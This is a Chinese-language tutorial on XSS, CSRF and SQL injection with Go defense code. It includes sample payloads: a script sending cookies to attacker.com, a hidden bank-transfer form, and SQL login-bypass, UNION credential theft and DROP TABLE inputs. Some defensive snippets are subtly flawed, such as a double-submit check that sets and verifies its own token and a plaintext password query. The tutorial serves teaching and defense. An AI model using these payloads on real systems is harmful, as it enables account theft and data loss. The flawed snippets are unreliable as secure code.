---
title: 常见的 Web 攻击方式：XSS、CSRF、SQL 注入及防御
tags:
  - 计算机网络
status: robot
class: 计算机网络
slug: common-web-attacks-xss-csrf-sql-injection-defense
ref:
---

## 核心要点

**XSS（跨站脚本攻击）**：攻击者注入恶意脚本到网页，在用户浏览器执行，窃取信息或操纵页面。防御：输入验证、输出编码、CSP策略、HttpOnly Cookie。

**CSRF（跨站请求伪造）**：诱导用户在已登录状态下执行非本意操作。防御：CSRF Token、SameSite Cookie、验证Referer、双重Cookie验证。

**SQL注入**：通过构造恶意SQL语句操纵数据库。防御：参数化查询（预编译语句）、ORM框架、最小权限原则、输入验证。

---

## XSS（Cross-Site Scripting）跨站脚本攻击

### 攻击原理
攻击者将恶意JavaScript代码注入到网页中，当其他用户访问该页面时，恶意脚本在用户浏览器中执行，从而窃取Cookie、会话令牌或执行其他恶意操作。

### XSS 类型

#### 1. 存储型XSS（Stored XSS）
恶意脚本永久存储在目标服务器上（如数据库、评论系统）。

```javascript
// 攻击示例：用户在评论中输入
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

// 当其他用户查看评论时，脚本执行，Cookie被窃取
```

#### 2. 反射型XSS（Reflected XSS）
恶意脚本通过URL参数传递，服务器直接将其反射到页面中。

```javascript
// 恶意URL
http://example.com/search?q=<script>alert(document.cookie)</script>

// 服务器直接将参数输出到页面
<div>搜索结果：<script>alert(document.cookie)</script></div>
```

#### 3. DOM型XSS
通过修改页面的DOM环境在客户端执行恶意脚本。

```javascript
// 页面代码
document.getElementById('output').innerHTML = location.hash.substring(1);

// 攻击URL
http://example.com/#<img src=x onerror="alert(document.cookie)">
```

### XSS 防御措施

#### 1. 输入验证与过滤
```go
// Go 示例：过滤特殊字符
func sanitizeInput(input string) string {
    // 移除或转义HTML特殊字符
    input = strings.ReplaceAll(input, "<", "&lt;")
    input = strings.ReplaceAll(input, ">", "&gt;")
    input = strings.ReplaceAll(input, "\"", "&quot;")
    input = strings.ReplaceAll(input, "'", "&#x27;")
    return input
}
```

#### 2. 输出编码
```go
// 使用 html/template 自动转义
import "html/template"

func renderPage(w http.ResponseWriter, userInput string) {
    tmpl := template.Must(template.New("page").Parse("<div>{{.}}</div>"))
    tmpl.Execute(w, userInput) // 自动HTML转义
}
```

#### 3. Content Security Policy (CSP)
```go
// 设置CSP响应头
func setCSPHeaders(w http.ResponseWriter) {
    w.Header().Set("Content-Security-Policy",
        "default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none'")
}
```

#### 4. HttpOnly 和 Secure Cookie
```go
// 设置安全的Cookie
http.SetCookie(w, &http.Cookie{
    Name:     "session",
    Value:    sessionID,
    HttpOnly: true,  // 防止JavaScript访问
    Secure:   true,  // 仅HTTPS传输
    SameSite: http.SameSiteStrictMode,
})
```

---

## CSRF（Cross-Site Request Forgery）跨站请求伪造

### 攻击原理
攻击者诱导受害者访问恶意网站，利用受害者在目标网站的登录状态，向目标网站发送伪造请求。

### 攻击示例

```html
<!-- 攻击者的恶意页面 -->
<img src="http://bank.com/transfer?to=attacker&amount=10000" style="display:none">

<!-- 或使用表单自动提交 -->
<form action="http://bank.com/transfer" method="POST" id="malicious">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('malicious').submit();</script>
```

当已登录银行网站的用户访问攻击者页面时，请求会自动发送，浏览器会自动携带用户的Cookie。

### CSRF 防御措施

#### 1. CSRF Token（最有效）
```go
// 生成CSRF Token
func generateCSRFToken() string {
    b := make([]byte, 32)
    rand.Read(b)
    return base64.URLEncoding.EncodeToString(b)
}

// 在表单中嵌入Token
func renderForm(w http.ResponseWriter, r *http.Request) {
    session, _ := store.Get(r, "session")
    csrfToken := generateCSRFToken()
    session.Values["csrf_token"] = csrfToken
    session.Save(r, w)

    tmpl := `<form method="POST">
        <input type="hidden" name="csrf_token" value="{{.}}">
        <button type="submit">提交</button>
    </form>`
    template.Must(template.New("form").Parse(tmpl)).Execute(w, csrfToken)
}

// 验证Token
func validateCSRFToken(r *http.Request) bool {
    session, _ := store.Get(r, "session")
    storedToken := session.Values["csrf_token"]
    submittedToken := r.FormValue("csrf_token")
    return storedToken == submittedToken
}
```

#### 2. SameSite Cookie属性
```go
http.SetCookie(w, &http.Cookie{
    Name:     "session",
    Value:    sessionID,
    SameSite: http.SameSiteStrictMode, // 或 SameSiteLaxMode
    // Strict: 完全禁止第三方Cookie
    // Lax: GET请求允许，POST等修改操作禁止
})
```

#### 3. 验证Referer和Origin头
```go
func checkReferer(r *http.Request) bool {
    referer := r.Header.Get("Referer")
    origin := r.Header.Get("Origin")

    allowedOrigins := []string{"https://example.com"}

    for _, allowed := range allowedOrigins {
        if strings.HasPrefix(referer, allowed) || origin == allowed {
            return true
        }
    }
    return false
}
```

#### 4. 双重Cookie验证
```go
// 在Cookie和请求参数中都设置Token，验证是否一致
func doubleSubmitCookie(w http.ResponseWriter, r *http.Request) bool {
    token := generateCSRFToken()

    // 设置Cookie
    http.SetCookie(w, &http.Cookie{
        Name:  "csrf_token",
        Value: token,
    })

    // 验证时比较Cookie和表单中的Token
    cookieToken, _ := r.Cookie("csrf_token")
    formToken := r.FormValue("csrf_token")

    return cookieToken.Value == formToken
}
```

---

## SQL注入（SQL Injection）

### 攻击原理
攻击者通过在输入中插入恶意SQL代码，改变原有SQL语句的逻辑，从而执行未授权的数据库操作。

### 攻击示例

#### 1. 绕过身份验证
```sql
-- 原始查询
SELECT * FROM users WHERE username='admin' AND password='123456'

-- 攻击输入：用户名输入 admin'--
SELECT * FROM users WHERE username='admin'--' AND password='xxx'
-- 注释掉了密码验证，直接登录成功
```

#### 2. 数据泄露
```sql
-- 原始查询
SELECT * FROM products WHERE id = 1

-- 攻击输入：id = 1 UNION SELECT username, password FROM users
SELECT * FROM products WHERE id = 1 UNION SELECT username, password FROM users
-- 获取所有用户的账号密码
```

#### 3. 数据破坏
```sql
-- 攻击输入：id = 1; DROP TABLE users;--
SELECT * FROM products WHERE id = 1; DROP TABLE users;--
-- 删除整个用户表
```

### SQL注入防御措施

#### 1. 参数化查询（预编译语句）- 最佳实践
```go
// ❌ 不安全：字符串拼接
func unsafeQuery(db *sql.DB, username, password string) {
    query := fmt.Sprintf("SELECT * FROM users WHERE username='%s' AND password='%s'",
        username, password)
    db.Query(query) // 易受SQL注入攻击
}

// ✅ 安全：参数化查询
func safeQuery(db *sql.DB, username, password string) (*sql.Rows, error) {
    query := "SELECT * FROM users WHERE username=? AND password=?"
    return db.Query(query, username, password) // 参数自动转义
}

// GoFrame 示例
func loginUser(ctx context.Context, username, password string) (*entity.User, error) {
    var user entity.User
    err := dao.User.Ctx(ctx).
        Where("username", username).
        Where("password", password).
        Scan(&user)
    return &user, err
}
```

#### 2. ORM框架
```go
// 使用 GoFrame ORM，自动防止SQL注入
import "github.com/gogf/gf/v2/database/gdb"

func getUserByID(ctx context.Context, id int) (*entity.User, error) {
    var user entity.User
    // ORM自动处理参数转义
    err := dao.User.Ctx(ctx).Where("id", id).Scan(&user)
    return &user, err
}

// 即使使用原生SQL，也应该用参数绑定
func rawQuerySafe(ctx context.Context, username string) (gdb.Result, error) {
    return g.DB().Ctx(ctx).Query(
        "SELECT * FROM users WHERE username = ?",
        username,
    )
}
```

#### 3. 输入验证和白名单
```go
// 验证输入格式
func validateUsername(username string) error {
    // 只允许字母、数字、下划线
    matched, _ := regexp.MatchString("^[a-zA-Z0-9_]{3,20}$", username)
    if !matched {
        return errors.New("invalid username format")
    }
    return nil
}

// 白名单验证（如排序字段）
func validateOrderBy(orderBy string) string {
    allowedFields := map[string]bool{
        "id": true, "name": true, "created_at": true,
    }
    if allowedFields[orderBy] {
        return orderBy
    }
    return "id" // 默认值
}
```

#### 4. 最小权限原则
```sql
-- 应用程序数据库用户只授予必要权限
GRANT SELECT, INSERT, UPDATE ON database.* TO 'app_user'@'localhost';
-- 不授予 DROP, CREATE 等危险权限
```

#### 5. 错误信息处理
```go
// ❌ 不要暴露详细的数据库错误信息
func badErrorHandling(w http.ResponseWriter, err error) {
    http.Error(w, err.Error(), 500)
    // 可能泄露数据库结构信息
}

// ✅ 使用通用错误信息
func goodErrorHandling(w http.ResponseWriter, err error) {
    log.Printf("Database error: %v", err) // 记录到日志
    http.Error(w, "Internal server error", 500) // 返回通用信息
}
```

---

## 三种攻击方式对比

| 攻击类型 | 攻击目标 | 执行位置 | 主要危害 | 核心防御 |
|---------|---------|---------|---------|---------|
| **XSS** | 用户浏览器 | 客户端 | 窃取Cookie、会话劫持、钓鱼 | 输出编码、CSP、HttpOnly Cookie |
| **CSRF** | Web应用 | 服务端 | 伪造用户请求、未授权操作 | CSRF Token、SameSite Cookie |
| **SQL注入** | 数据库 | 服务端 | 数据泄露、篡改、删除 | 参数化查询、ORM框架 |

---

## 综合防御最佳实践

```go
// 综合安全的用户登录示例
func SecureLogin(w http.ResponseWriter, r *http.Request) {
    // 1. 验证CSRF Token
    if !validateCSRFToken(r) {
        http.Error(w, "Invalid CSRF token", 403)
        return
    }

    // 2. 输入验证
    username := r.FormValue("username")
    password := r.FormValue("password")

    if err := validateUsername(username); err != nil {
        http.Error(w, "Invalid username", 400)
        return
    }

    // 3. 使用参数化查询防止SQL注入
    var user User
    err := db.QueryRow("SELECT id, password_hash FROM users WHERE username=?", username).
        Scan(&user.ID, &user.PasswordHash)

    if err != nil {
        log.Printf("Login error: %v", err)
        http.Error(w, "Invalid credentials", 401)
        return
    }

    // 4. 验证密码（使用bcrypt等安全哈希）
    if !checkPasswordHash(password, user.PasswordHash) {
        http.Error(w, "Invalid credentials", 401)
        return
    }

    // 5. 设置安全Cookie
    sessionID := generateSessionID()
    http.SetCookie(w, &http.Cookie{
        Name:     "session",
        Value:    sessionID,
        HttpOnly: true,              // 防XSS
        Secure:   true,              // 仅HTTPS
        SameSite: http.SameSiteStrictMode, // 防CSRF
        MaxAge:   3600,
    })

    // 6. 设置安全响应头
    w.Header().Set("Content-Security-Policy", "default-src 'self'")
    w.Header().Set("X-Content-Type-Options", "nosniff")
    w.Header().Set("X-Frame-Options", "DENY")

    w.Write([]byte("Login successful"))
}
```
